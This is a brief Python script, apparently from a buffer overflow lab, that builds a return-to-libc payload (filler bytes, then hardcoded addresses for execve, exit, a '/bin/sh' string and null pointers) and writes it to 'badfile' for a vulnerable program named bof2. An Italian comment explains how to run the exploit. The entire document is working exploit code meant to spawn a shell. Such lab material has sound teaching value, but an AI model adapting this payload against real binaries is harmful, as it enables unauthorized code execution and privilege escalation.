import struct

buffer_eip = 18
execve = 0xb7eb5660
binsh = 0x804a02c
null = 0x804a035
exit = 0xb7e327f0

atk_vector = "A"*buffer_eip
atk_vector += struct.pack("I", execve)
atk_vector += struct.pack("I", exit)
atk_vector += struct.pack("I", binsh)
atk_vector += struct.pack("I", null)
atk_vector += struct.pack("I", null)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

#N.B. Per eseguire questo exploit basta dare da cmd il seguente comando: ./bof2
